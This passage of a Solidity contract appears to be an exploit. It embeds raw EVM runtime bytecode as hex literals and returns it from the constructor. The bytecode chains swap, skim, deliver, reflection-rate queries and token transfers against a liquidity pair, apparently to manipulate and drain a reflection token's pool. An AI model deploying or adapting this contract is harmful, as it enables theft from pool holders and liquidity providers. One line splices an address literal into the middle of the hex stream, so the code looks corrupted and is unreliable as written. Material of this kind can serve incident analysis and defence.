            hex"06289190612fee565b506dffffffffffffffffffffffffffff1691506dffffff",
            hex"ffffffffffffffffffffff1691506000610665848461065e9190612f38565b83",
            hex"85611ee8565b9050600560009054906101000a900473ffffffffffffffffffff",
            hex"ffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff",
            hex"1663a9059cbb600260009054906101000a900473ffffffffffffffffffffffff",
            hex"ffffffffffffffff166103e8600954856106d99190612e01565b6106e3919061",
            hex"2e72565b6040518363ffffffff1660e01b815260040161070092919061304156",
            hex"5b6020604051808303816000875af115801561071f573d6000803e3d6000fd5b",
            hex"505050506040513d601f19601f82011682018060405250810190610743919061",
            hex"307f565b5060016000815480929190610757906130ac565b9190505550505050",
            hex"50505050506109b4565b6019600154116109b357600060036000905490610100",
            hex"0a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffff",
            hex"ffffffffffffffffffffffffffff166370a08231600260009054906101000a90",
            hex"0473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff",
            hex"1660e01b81526004016107f29190612eb2565b602060405180830381865afa15",
            hex"801561080f573d6000803e3d6000fd5b505050506040513d601f19601f820116",
            hex"820180604052508101906108339190612ee2565b905060006002600090549061",
            hex"01000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffff",
            hex"ffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff16",
            hex"60e01b8152600401606060405180830381865afa1580156108a4573d6000803e",
            hex"3d6000fd5b505050506040513d601f19601f8201168201806040525081019061",
            hex"08c89190612fee565b50506dffffffffffffffffffffffffffff169050600082",
            hex"826108ea9190612f38565b9050600360009054906101000a900473ffffffffff",
            hex"ffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffff",
            hex"ffffffffff16633bd5d1736103e86009548461093b9190612e01565b61094591",
            hex"90612e72565b6040518263ffffffff1660e01b81526004016109619190612db7",
            hex"565b600060405180830381600087803b15801561097b57600080fd5b505af115",
            hex"801561098f573d6000803e3d6000fd5b50505050600160008154809291906109",
            hex"a6906130ac565b91905055505050506109b4565b5b5050505050565b6000600a",
            hex"60009054906101000a900460ff16610a0c576040517f08c379a0000000000000",
            hex"000000000000000000000000000000000000000000008152600401610a039061",
            hex"3151565b60405180910390fd5b610a14610ed5565b600a60019054906101000a",
            hex"900460ff16610a63576040517f08c379a0000000000000000000000000000000",
            abi.encode(address(0x008152600401610a5A906131BD565b6040518091)),
            hex"0390fd5b600190509695505050505050565b81600a60016101000a81548160ff",
            hex"02191690831515021790555082600a60006101000a81548160ff021916908315",
            hex"15021790555080600a60026101000a81548160ff021916908315150217905550",
            hex"600560009054906101000a900473ffffffffffffffffffffffffffffffffffff",
            hex"ffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b37387",
            hex"870bca3f3fd6335c3f4ce8392d69350b4fa4e26000196040518363ffffffff16",
            hex"60e01b8152600401610b32929190613041565b6020604051808303816000875a",
            hex"f1158015610b51573d6000803e3d6000fd5b505050506040513d601f19601f82",
            hex"011682018060405250810190610b75919061307f565b50600560009054906101",
            hex"000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffff",
            hex"ffffffffffffffffffffffffffffff1663095ea7b373111b4b22ee7ea68703d8",
            hex"e54ea49aa1bb0d1581286000196040518363ffffffff1660e01b815260040161",
            hex"0be9929190613041565b6020604051808303816000875af1158015610c08573d",
            hex"6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250",
            hex"810190610c2c919061307f565b5060008054906101000a900473ffffffffffff",
            hex"ffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffff",
            hex"ffffffff166342b0b77c3073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
            hex"682086ac351052600000600167ffffffffffffffff811115610ca457610ca361",
            hex"31dd565b5b6040519080825280601f01601f191660200182016040528015610c",
            hex"d65781602001600182028036833780820191505090505b5060006040518663ff",
            hex"ffffff1660e01b8152600401610cf995949392919061332a565b600060405180",
            hex"830381600087803b158015610d1357600080fd5b505af1158015610d27573d60",
            hex"00803e3d6000fd5b50505050600560009054906101000a900473ffffffffffff",
            hex"ffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffff",
            hex"ffffffff1663a9059cbb738a4571c3a618e00d04287ca6385b6b020ce7a30560",
            hex"0560009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040",
            hex"518263ffffffff1660e01b8152600401610dd99190612eb2565b602060405180",
            hex"830381865afa158015610df6573d6000803e3d6000fd5b505050506040513d60",
            hex"1f19601f82011682018060405250810190610e1a9190612ee2565b6040518363",
            hex"ffffffff1660e01b8152600401610e37929190613041565b6020604051808303",
            hex"816000875af1158015610e56573d6000803e3d6000fd5b505050506040513d60",
            hex"1f19601f82011682018060405250810190610e7a919061307f565b50600a6002",
            hex"9054906101000a900460ff16610eca576040517f08c379a00000000000000000",
            hex"00000000000000000000000000000000000000008152600401610ec1906133d0",
            hex"565b60405180910390fd5b505050565b60075481565b60026001819055506000",
            hex"612711620186a0600654610ef39190612e72565b610efd9190612e01565b9050",
            hex"6000610f1e826803271c2e52130ad4e6683633707c9d224f2e44611ee8565b90",
            hex"50600560009054906101000a900473ffffffffffffffffffffffffffffffffff",
            hex"ffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60",
            hex"0260009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff16836040518363ffffffff1660e01b8152600401610f9f929190613041565b",
            hex"6020604051808303816000875af1158015610fbe573d6000803e3d6000fd5b50",
            hex"5050506040513d601f19601f82011682018060405250810190610fe291906130",
            hex"7f565b50600260009054906101000a900473ffffffffffffffffffffffffffff",
            hex"ffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663022c",
            hex"0d9f83600030600067ffffffffffffffff8111156110405761103f6131dd565b",
            hex"5b6040519080825280601f01601f191660200182016040528015611072578160",
            hex"2001600182028036833780820191505090505b506040518563ffffffff1660e0",
            hex"1b81526004016110929493929190613421565b60006040518083038160008780",
            hex"3b1580156110ac57600080fd5b505af11580156110c0573d6000803e3d6000fd",
            hex"5b50505050600360009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9",
            hex"059cbb600460009054906101000a900473ffffffffffffffffffffffffffffff",
            hex"ffffffffff1660016040518363ffffffff1660e01b8152600401611144929190",
            hex"6134a8565b6020604051808303816000875af1158015611163573d6000803e3d",
            hex"6000fd5b505050506040513d601f19601f820116820180604052508101906111",
            hex"87919061307f565b50600360009054906101000a900473ffffffffffffffffff",
            hex"ffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffff",
            hex"ff16634549b03960065460006040518363ffffffff1660e01b81526004016111",
            hex"e8929190612f0f565b602060405180830381865afa158015611205573d600080",
            hex"3e3d6000fd5b505050506040513d601f19601f82011682018060405250810190",
            hex"6112299190612ee2565b600781905550600360009054906101000a900473ffff",
            hex"ffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffff",
            hex"ffffffffffffffff16634549b039600360009054906101000a900473ffffffff",
            hex"ffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffff",
            hex"ffffffffffff166370a08231306040518263ffffffff1660e01b815260040161",
            hex"12c89190612eb2565b602060405180830381865afa1580156112e5573d600080",
            hex"3e3d6000fd5b505050506040513d601f19601f82011682018060405250810190",
            hex"6113099190612ee2565b60006040518363ffffffff1660e01b81526004016113",
            hex"28929190612f0f565b602060405180830381865afa158015611345573d600080",
            hex"3e3d6000fd5b505050506040513d601f19601f82011682018060405250810190",
            hex"6113699190612ee2565b6008819055506002600181905550611384610409600a",
            hex"611f46565b600360009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166345",
            hex"49b039600360009054906101000a900473ffffffffffffffffffffffffffffff",
            hex"ffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a082",
            hex"31306040518263ffffffff1660e01b815260040161141d9190612eb2565b6020",
            hex"60405180830381865afa15801561143a573d6000803e3d6000fd5b5050505060",
            hex"40513d601f19601f8201168201806040525081019061145e9190612ee2565b60",
            hex"006040518363ffffffff1660e01b815260040161147d929190612f0f565b6020",
            hex"60405180830381865afa15801561149a573d6000803e3d6000fd5b5050505060",
            hex"40513d601f19601f820116820180604052508101906114be9190612ee2565b60",
            hex"08819055506114d161040a600a611f46565b600360009054906101000a900473",
            hex"ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffff",
            hex"ffffffffffffffffffff16634549b039600360009054906101000a900473ffff",
            hex"ffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffff",
            hex"ffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004",
            hex"0161156a9190612eb2565b602060405180830381865afa158015611587573d60",
            hex"00803e3d6000fd5b505050506040513d601f19601f8201168201806040525081",
            hex"01906115ab9190612ee2565b60006040518363ffffffff1660e01b8152600401",
            hex"6115ca929190612f0f565b602060405180830381865afa1580156115e7573d60",
            hex"00803e3d6000fd5b505050506040513d601f19601f8201168201806040525081",
            hex"019061160b9190612ee2565b60088190555061161e61040b600a611f46565b60",
            hex"0360009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff1673ffffffffffffffffffffffffffffffffffffffff16634549b039600360",
            hex"009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16",
            hex"73ffffffffffffffffffffffffffffffffffffffff166370a082313060405182",
            hex"63ffffffff1660e01b81526004016116b79190612eb2565b6020604051808303",
            hex"81865afa1580156116d4573d6000803e3d6000fd5b505050506040513d601f19",
            hex"601f820116820180604052508101906116f89190612ee2565b60006040518363",
            hex"ffffffff1660e01b8152600401611717929190612f0f565b6020604051808303",
            hex"81865afa158015611734573d6000803e3d6000fd5b505050506040513d601f19",
            hex"601f820116820180604052508101906117589190612ee2565b60088190555061",
            hex"176b61040c600a611f46565b61177861042d600a611f46565b61178561041660",
            hex"0a611f46565b6117926103fa6004611f46565b61179d6127106121b0565b6003",
            hex"60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff",
            hex"1673ffffffffffffffffffffffffffffffffffffffff16634549b03960065460",
            hex"006040518363ffffffff1660e01b81526004016117fd929190612f0f565b6020",
            hex"60405180830381865afa15801561181a573d6000803e3d6000fd5b5050505060",
            hex"40513d601f19601f8201168201806040525081019061183e9190612ee2565b60",
            hex"0781905550611851610447600a611f46565b61185e610439600a611f46565b61",
            hex"186b61042a600a611f46565b611878610419600a611f46565b61188561040560",
            hex"0a611f46565b6118906113886121b0565b600360009054906101000a900473ff",
            hex"ffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff",
            hex"ffffffffffffffffff16634549b03960065460006040518363ffffffff1660e0",
            hex"1b81526004016118f0929190612f0f565b602060405180830381865afa158015",
            hex"61190d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201",
            hex"80604052508101906119319190612ee2565b600781905550611944610419600a",
            hex"611f46565b61195161040d600a611f46565b61195e6103ff600a611f46565b61",
            hex"19696101f46121b0565b600360009054906101000a900473ffffffffffffffff",
            hex"ffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffff",
            hex"ffff16634549b03960065460006040518363ffffffff1660e01b815260040161",
            hex"19c9929190612f0f565b602060405180830381865afa1580156119e6573d6000",
            hex"803e3d6000fd5b505050506040513d601f19601f820116820180604052508101",
            hex"90611a0a9190612ee2565b600781905550611a1d6103f46006611f46565b611a",
            hex"2861232b612511565b60005b600e8111611a5157611a3e610384611d89565b80",
            hex"80611a49906130ac565b915050611a2b565b50600360009054906101000a9004",
            hex"73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffff",
            hex"ffffffffffffffffffffff166323b872dd30600460009054906101000a900473",
            hex"ffffffffffffffffffffffffffffffffffffffff1660016040518463ffffffff",
            hex"1660e01b8152600401611ad4939291906134d1565b6020604051808303816000",
            hex"875af1158015611af3573d6000803e3d6000fd5b505050506040513d601f1960",
            hex"1f82011682018060405250810190611b17919061307f565b5060005b600e8111",
            hex"611b4157611b2e610384611d89565b8080611b39906130ac565b915050611b1b",
            hex"565b50600360009054906101000a900473ffffffffffffffffffffffffffffff",
            hex"ffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872",
            hex"dd30600460009054906101000a900473ffffffffffffffffffffffffffffffff",
            hex"ffffffff1660016040518463ffffffff1660e01b8152600401611bc493929190",
            hex"6134d1565b6020604051808303816000875af1158015611be3573d6000803e3d",
            hex"6000fd5b505050506040513d601f19601f82011682018060405250810190611c",
            hex"07919061307f565b5060005b600e8111611c3157611c1e610384611d89565b80",
            hex"80611c29906130ac565b915050611c0b565b50600360009054906101000a9004",
            hex"73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffff",
            hex"ffffffffffffffffffffff166323b872dd30600460009054906101000a900473",
            hex"ffffffffffffffffffffffffffffffffffffffff1660016040518463ffffffff",
            hex"1660e01b8152600401611cb4939291906134d1565b6020604051808303816000",
            hex"875af1158015611cd3573d6000803e3d6000fd5b505050506040513d601f1960",
            hex"1f82011682018060405250810190611cf7919061307f565b5060005b60068111",
            hex"611d2157611d0e610384611d89565b8080611d19906130ac565b915050611cfb",
            hex"565b50611d2d6101f4611d89565b611d386101f4611d89565b611d436101f461",
            hex"1d89565b611d4d6032611d89565b611d5861038461019c565b611d6361012c61",
            hex"019c565b611d6d606461019c565b611d77601461019c565b611d7f6127cd565b",
            hex"5050565b60015481565b600360009054906101000a900473ffffffffffffffff",
            hex"ffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffff",
            hex"ffff16633bd5d1736103e883600654611dd89190612e01565b611de29190612e",
            hex"72565b6040518263ffffffff1660e01b8152600401611dfe9190612db7565b60",
            hex"0060405180830381600087803b158015611e1857600080fd5b505af115801561",
            hex"1e2c573d6000803e3d6000fd5b50505050600260009054906101000a900473ff",
            hex"ffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff",
            hex"ffffffffffffffffff1663bc25cf77600460009054906101000a900473ffffff",
            hex"ffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81",
            hex"52600401611ead9190612eb2565b600060405180830381600087803b15801561",
            hex"1ec757600080fd5b505af1158015611edb573d6000803e3d6000fd5b50505050",
            hex"50565b60085481565b6000806103e88585611efa9190612e01565b611f049190",
            hex"612e01565b905060006103e58685611f179190612f38565b611f219190612e01",
            hex"565b905060018183611f319190612e72565b611f3b9190613508565b92505050",
            hex"9392505050565b816009819055506000600360009054906101000a900473ffff",
            hex"ffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffff",
            hex"ffffffffffffffff16632d838119836064600754611f9d9190612e72565b611f",
            hex"a79190612e01565b6040518263ffffffff1660e01b8152600401611fc3919061",
            hex"2db7565b602060405180830381865afa158015611fe0573d6000803e3d6000fd",
            hex"5b505050506040513d601f19601f820116820180604052508101906120049190",
            hex"612ee2565b9050600260009054906101000a900473ffffffffffffffffffffff",
            hex"ffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16",
            hex"63022c0d9f82600030600167ffffffffffffffff811115612063576120626131",
            hex"dd565b5b6040519080825280601f01601f191660200182016040528015612095",
            hex"5781602001600182028036833780820191505090505b506040518563ffffffff",
            hex"1660e01b81526004016120b59493929190613421565b60006040518083038160",
            hex"0087803b1580156120cf57600080fd5b505af11580156120e3573d6000803e3d",
            hex"6000fd5b50505050600360009054906101000a900473ffffffffffffffffffff",
            hex"ffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff",
            hex"1663a9059cbb600460009054906101000a900473ffffffffffffffffffffffff",
            hex"ffffffffffffffff1660016040518363ffffffff1660e01b8152600401612167",
            hex"9291906134a8565b6020604051808303816000875af1158015612186573d6000",
            hex"803e3d6000fd5b505050506040513d601f19601f820116820180604052508101",
            hex"906121aa919061307f565b50505050565b600080600260009054906101000a90",
            hex"0473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffff",
            hex"ffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b81",
            hex"52600401606060405180830381865afa158015612220573d6000803e3d6000fd",
            hex"5b505050506040513d601f19601f820116820180604052508101906122449190",
            hex"612fee565b826dffffffffffffffffffffffffffff169250816dffffffffffff",
            hex"ffffffffffffffff169150508092508193505050600083620186a06006546122",
            hex"879190612e72565b6122919190612e01565b905060006122a0828486611ee856",
            hex"5b9050600560009054906101000a900473ffffffffffffffffffffffffffffff",
            hex"ffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059c",
            hex"bb600260009054906101000a900473ffffffffffffffffffffffffffffffffff",
            hex"ffffff16836040518363ffffffff1660e01b8152600401612321929190613041",
            hex"565b6020604051808303816000875af1158015612340573d6000803e3d6000fd",
            hex"5b505050506040513d601f19601f820116820180604052508101906123649190",
            hex"61307f565b50600260009054906101000a900473ffffffffffffffffffffffff",
            hex"ffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663",
            hex"022c0d9f83600030600067ffffffffffffffff8111156123c2576123c16131dd",
            hex"565b5b6040519080825280601f01601f1916602001820160405280156123f457",
            hex"81602001600182028036833780820191505090505b506040518563ffffffff16",
            hex"60e01b81526004016124149493929190613421565b6000604051808303816000",
            hex"87803b15801561242e57600080fd5b505af1158015612442573d6000803e3d60",
            hex"00fd5b50505050600360009054906101000a900473ffffffffffffffffffffff",
            hex"ffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16",
            hex"63a9059cbb600460009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff1660016040518363ffffffff1660e01b81526004016124c692",
            hex"91906134a8565b6020604051808303816000875af11580156124e5573d600080",
            hex"3e3d6000fd5b505050506040513d601f19601f82011682018060405250810190",
            hex"612509919061307f565b505050505050565b600080600260009054906101000a",
            hex"900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffff",
            hex"ffffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b",
            hex"8152600401606060405180830381865afa158015612581573d6000803e3d6000",
            hex"fd5b505050506040513d601f19601f820116820180604052508101906125a591",
            hex"90612fee565b826dffffffffffffffffffffffffffff169250816dffffffffff",
            hex"ffffffffffffffffff169150508092508193505050600061271084846125e591",
            hex"90612e01565b6125ef9190612e72565b905060006125fe828486611ee8565b90",
            hex"50600560009054906101000a900473ffffffffffffffffffffffffffffffffff",
            hex"ffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60",
            hex"0260009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff16836040518363ffffffff1660e01b815260040161267f929190613041565b",
            hex"6020604051808303816000875af115801561269e573d6000803e3d6000fd5b50",
            hex"5050506040513d601f19601f820116820180604052508101906126c291906130",
            hex"7f565b50600260009054906101000a900473ffffffffffffffffffffffffffff",
            hex"ffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663022c",
            hex"0d9f836000600460009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff16600067ffffffffffffffff811115612742576127416131dd",
            hex"565b5b6040519080825280601f01601f19166020018201604052801561277457",
            hex"81602001600182028036833780820191505090505b506040518563ffffffff16",
            hex"60e01b81526004016127949493929190613421565b6000604051808303816000",
            hex"87803b1580156127ae57600080fd5b505af11580156127c2573d6000803e3d60",
            hex"00fd5b505050505050505050565b6000600360009054906101000a900473ffff",
            hex"ffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffff",
            hex"ffffffffffffffff166370a08231600260009054906101000a900473ffffffff",
            hex"ffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152",
            hex"60040161284c9190612eb2565b602060405180830381865afa15801561286957",
            hex"3d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052",
            hex"5081019061288d9190612ee2565b9050600080600260009054906101000a9004",
            hex"73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffff",
            hex"ffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b8152",
            hex"600401606060405180830381865afa1580156128ff573d6000803e3d6000fd5b",
            hex"505050506040513d601f19601f82011682018060405250810190612923919061",
            hex"2fee565b506dffffffffffffffffffffffffffff1691506dffffffffffffffff",
            hex"ffffffffffff169150600061296083856129599190612f38565b8484612a4956",
            hex"5b9050600260009054906101000a900473ffffffffffffffffffffffffffffff",
            hex"ffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663022c0d",
            hex"9f60008330600067ffffffffffffffff8111156129bf576129be6131dd565b5b",
            hex"6040519080825280601f01601f1916602001820160405280156129f157816020",
            hex"01600182028036833780820191505090505b506040518563ffffffff1660e01b",
            hex"8152600401612a11949392919061353c565b600060405180830381600087803b",
            hex"158015612a2b57600080fd5b505af1158015612a3f573d6000803e3d6000fd5b",
            hex"5050505050505050565b6000806103e585612a5a9190612e01565b9050600083",
            hex"82612a6a9190612e01565b90506000826103e887612a7d9190612e01565b612a",
            hex"879190613508565b90508082612a959190612e72565b93505050509392505050",
            hex"565b600080fd5b600080fd5b6000819050919050565b612abe81612aab565b81",
            hex"14612ac957600080fd5b50565b600081359050612adb81612ab5565b92915050",
            hex"565b600060208284031215612af757612af6612aa1565b5b6000612b05848285",
            hex"01612acc565b91505092915050565b600073ffffffffffffffffffffffffffff",
            hex"ffffffffffff82169050919050565b6000612b3982612b0e565b905091905056",
            hex"5b612b4981612b2e565b8114612b5457600080fd5b50565b600081359050612b",
            hex"6681612b40565b92915050565b600080fd5b600080fd5b600080fd5b60008083",
            hex"601f840112612b9157612b90612b6c565b5b8235905067ffffffffffffffff81",
            hex"1115612bae57612bad612b71565b5b602083019150836001820283011115612b",
            hex"ca57612bc9612b76565b5b9250929050565b6000806000806000608086880312",
            hex"15612bed57612bec612aa1565b5b6000612bfb88828901612b57565b95505060",
            hex"20612c0c88828901612acc565b9450506040612c1d88828901612acc565b9350",
            hex"50606086013567ffffffffffffffff811115612c3e57612c3d612aa6565b5b61",
            hex"2c4a88828901612b7b565b92509250509295509295909350565b600080600080",
            hex"60008060a08789031215612c7657612c75612aa1565b5b6000612c8489828a01",
            hex"612b57565b9650506020612c9589828a01612acc565b9550506040612ca68982",
            hex"8a01612acc565b9450506060612cb789828a01612b57565b9350506080870135",
            hex"67ffffffffffffffff811115612cd857612cd7612aa6565b5b612ce489828a01",
            hex"612b7b565b92509250509295509295509295565b60008115159050919050565b",
            hex"612d0881612cf3565b82525050565b6000602082019050612d23600083018461",
            hex"2cff565b92915050565b612d3281612cf3565b8114612d3d57600080fd5b5056",
            hex"5b600081359050612d4f81612d29565b92915050565b60008060006060848603",
            hex"1215612d6e57612d6d612aa1565b5b6000612d7c86828701612d40565b935050",
            hex"6020612d8d86828701612d40565b9250506040612d9e86828701612d40565b91",
            hex"50509250925092565b612db181612aab565b82525050565b6000602082019050",
            hex"612dcc6000830184612da8565b92915050565b7f4e487b710000000000000000",
            hex"0000000000000000000000000000000000000000600052601160045260246000",
            hex"fd5b6000612e0c82612aab565b9150612e1783612aab565b9250828202612e25",
            hex"81612aab565b91508282048414831517612e3c57612e3b612dd2565b5b509291",
            hex"5050565b7f4e487b710000000000000000000000000000000000000000000000",
            hex"0000000000600052601260045260246000fd5b6000612e7d82612aab565b9150",
            hex"612e8883612aab565b925082612e9857612e97612e43565b5b82820490509291",
            hex"5050565b612eac81612b2e565b82525050565b6000602082019050612ec76000",
            hex"830184612ea3565b92915050565b600081519050612edc81612ab5565b929150",
            hex"50565b600060208284031215612ef857612ef7612aa1565b5b6000612f068482",
            hex"8501612ecd565b91505092915050565b6000604082019050612f246000830185",
            hex"612da8565b612f316020830184612cff565b9392505050565b6000612f438261",
            hex"2aab565b9150612f4e83612aab565b9250828203905081811115612f6657612f",
            hex"65612dd2565b5b92915050565b60006dffffffffffffffffffffffffffff8216",
            hex"9050919050565b612f8f81612f6c565b8114612f9a57600080fd5b50565b6000",
            hex"81519050612fac81612f86565b92915050565b600063ffffffff821690509190",
            hex"50565b612fcb81612fb2565b8114612fd657600080fd5b50565b600081519050",
            hex"612fe881612fc2565b92915050565b6000806000606084860312156130075761",
            hex"3006612aa1565b5b600061301586828701612f9d565b93505060206130268682",
            hex"8701612f9d565b925050604061303786828701612fd9565b9150509250925092",
            hex"565b60006040820190506130566000830185612ea3565b613063602083018461",
            hex"2da8565b9392505050565b60008151905061307981612d29565b92915050565b",
            hex"60006020828403121561309557613094612aa1565b5b60006130a38482850161",
            hex"306a565b91505092915050565b60006130b782612aab565b91507fffffffffff",
            hex"ffffffffffffffffffffffffffffffffffffffffffffffffffffff82036130e9",
            hex"576130e8612dd2565b5b600182019050919050565b6000828252602082019050",
            hex"92915050565b7f7a7a7a00000000000000000000000000000000000000000000",
            hex"00000000000000600082015250565b600061313b6003836130f4565b91506131",
            hex"4682613105565b602082019050919050565b6000602082019050818103600083",
            hex"015261316a8161312e565b9050919050565b7f73737300000000000000000000",
            hex"00000000000000000000000000000000000000600082015250565b60006131a7",
            hex"6003836130f4565b91506131b282613171565b602082019050919050565b6000",
            hex"60208201905081810360008301526131d68161319a565b9050919050565b7f4e",
            hex"487b710000000000000000000000000000000000000000000000000000000060",
            hex"0052604160045260246000fd5b6000819050919050565b600081905091905056",
            hex"5b600061323b6132366132318461320c565b613216565b612aab565b90509190",
            hex"50565b61324b81613220565b82525050565b600081519050919050565b600082",
            hex"825260208201905092915050565b60005b8381101561328b5780820151818401",
            hex"52602081019050613270565b60008484015250505050565b6000601f19601f83",
            hex"01169050919050565b60006132b382613251565b6132bd818561325c565b9350",
            hex"6132cd81856020860161326d565b6132d681613297565b840191505092915050",
            hex"565b6000819050919050565b600061ffff82169050919050565b600061331461",
            hex"330f61330a846132e1565b613216565b6132eb565b9050919050565b61332481",
            hex"6132f9565b82525050565b600060a08201905061333f6000830188612ea3565b",
            hex"61334c6020830187612ea3565b6133596040830186613242565b818103606083",
            hex"015261336b81856132a8565b905061337a608083018461331b565b9695505050",
            hex"505050565b7f6b6b6b0000000000000000000000000000000000000000000000",
            hex"000000000000600082015250565b60006133ba6003836130f4565b91506133c5",
            hex"82613384565b602082019050919050565b600060208201905081810360008301",
            hex"526133e9816133ad565b9050919050565b600061340b613406613401846132e1",
            hex"565b613216565b612aab565b9050919050565b61341b816133f0565b82525050",
            hex"565b60006080820190506134366000830187612da8565b613443602083018661",
            hex"3412565b6134506040830185612ea3565b818103606083015261346281846132",
            hex"a8565b905095945050505050565b6000819050919050565b600061349261348d",
            hex"6134888461346d565b613216565b612aab565b9050919050565b6134a2816134",
            hex"77565b82525050565b60006040820190506134bd6000830185612ea3565b6134",
            hex"ca6020830184613499565b9392505050565b60006060820190506134e6600083",
            hex"0186612ea3565b6134f36020830185612ea3565b613500604083018461349956",
            hex"5b949350505050565b600061351382612aab565b915061351e83612aab565b92",
            hex"5082820190508082111561353657613535612dd2565b5b92915050565b600060",
            hex"80820190506135516000830187613412565b61355e6020830186612da8565b61",
            hex"356b6040830185612ea3565b818103606083015261357d81846132a8565b9050",
            hex"9594505050505056fea26469706673582212203c55b3fba1800c3037df4b7558",
            hex"516f5b83c8c46334e4d242de47317bbda6f0c564736f6c63430008120033"
        );
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}
